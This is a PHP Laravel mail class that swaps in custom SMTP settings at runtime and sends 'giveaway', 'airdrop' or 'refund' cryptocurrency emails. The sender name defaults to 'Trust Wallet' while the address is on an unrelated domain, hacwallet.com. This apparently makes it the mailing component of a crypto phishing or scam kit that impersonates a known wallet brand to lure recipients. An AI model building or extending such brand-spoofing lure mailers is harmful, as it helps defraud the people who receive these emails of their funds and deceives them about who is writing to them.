<?php

namespace App\Mail;

use Illuminate\Bus\Queueable;
use Illuminate\Mail\Mailable;
use Illuminate\Queue\SerializesModels;
use Illuminate\Support\Facades\Config;

class CryptoMail extends Mailable
{
    use Queueable, SerializesModels;

    public $template;
    public $cryptoType;
    public $quantity;
    public $sent_id;

    public function __construct($template, $cryptoType, $quantity, $sent_id)
    {
        $this->template = $template;
        $this->cryptoType = $cryptoType;
        $this->quantity = $quantity;
        $this->sent_id = $sent_id;
    }

    public function build()
    {
        Config::set('mail.mailers.smtp', [
            'transport' => 'smtp',
            'host' => env('CUSTOM_MAIL_HOST', 'smtp.hostinger.com'),
            'port' => env('CUSTOM_MAIL_PORT', 587),
            'encryption' => env('CUSTOM_MAIL_ENCRYPTION', 'tls'),
            'username' => env('CUSTOM_MAIL_USERNAME'),
            'password' => env('CUSTOM_MAIL_PASSWORD'),
            'timeout' => null,
            'auth_mode' => null,
        ]);

        $subject = match ($this->template) {
            'giveaway' => 'Crypto Giveaway Notification',
            'airdrop' => 'Crypto Airdrop Confirmation',
            'refund' => 'Crypto Refund Processed',
        };

        $view = match ($this->template) {
            'giveaway' => 'emails.giveaway',
            'airdrop' => 'emails.airdrop',
            'refund' => 'emails.refund',
        };

        return $this->subject($subject)
            ->from(env('CUSTOM_MAIL_FROM_ADDRESS', 'mail@hacwallet.com'), env('CUSTOM_MAIL_FROM_NAME', 'Trust Wallet'))
            ->view($view)
            ->with([
                'cryptoType' => $this->cryptoType,
                'quantity' => $this->quantity,
                'sent_id' => $this->sent_id,
            ]);
    }
}
